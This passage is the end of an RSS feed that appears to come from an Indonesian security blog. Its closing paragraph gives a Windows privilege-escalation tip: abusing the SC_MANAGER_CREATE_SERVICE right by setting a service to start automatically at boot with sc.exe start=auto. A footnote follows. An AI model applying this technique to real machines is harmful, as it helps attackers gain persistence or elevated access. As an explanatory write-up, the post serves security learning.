+<p>Nah untuk eksploitasi hak <code>SC_MANAGER_CREATE_SERVICE</code> tanpa custom compiled program kita bisa mengubah nilai &ldquo;start up type&rdquo; si service ke otomatis ketika booting dengan mensuplai <code>start=auto</code> pada <code>sc.exe</code>.</p>
+<p>Sekian~</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>*Ngulik itu sebangsa ngoprek 😅&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
